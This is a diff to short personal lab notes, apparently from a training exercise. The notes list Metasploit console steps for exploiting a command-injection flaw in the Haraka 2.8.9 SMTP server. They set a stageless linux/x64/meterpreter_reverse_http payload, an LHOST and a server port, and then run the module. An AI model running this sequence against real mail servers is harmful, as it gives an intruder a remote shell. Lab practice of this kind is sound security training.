@@ -28,8 +28,8 @@ Haraka versions V2.8.9 are vulnerable to command injection.
 >>>>linux/smtp/haraka
 >>>>set SRV_PRT 9898
 >>>>set email_to root@attackdefence.text
->>>>> set Payload linux/x64/meterpreter_reverse_http
-THIS IS A STAGELESS PAYLOAD
+>>>>> set Payload linux/x64/meterpreter_reverse_http  
+\THIS IS A STAGELESS PAYLOAD
 >>>>set LHOST **<eth1>**
 *tHIS NEEDS 8080 THATS WHY WE CHANGED SRV_PORT TO DIFFERENT ONE*
 >>>>> RUN
